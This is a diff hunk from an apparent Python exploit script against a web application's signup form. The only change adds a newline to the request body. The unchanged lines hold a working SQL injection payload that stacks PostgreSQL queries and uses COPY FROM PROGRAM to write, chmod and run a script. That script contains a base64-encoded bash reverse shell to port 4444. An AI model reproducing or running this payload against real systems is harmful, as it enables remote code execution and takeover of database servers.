@@ -23,6 +23,6 @@ random_group = generate_random_word()
 
 payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';COPY+{random_group}+TO+'/tmp/atest.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/atest.sh';copy+{random_group}+from+program+'/tmp/atest.sh'--+-"
 
-data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload}&email={random_group}@a.com&password=test&repeatPassword=test"
+data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload}&email={random_group}@a.com&password=test&repeatPassword=test\n"
 
 response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
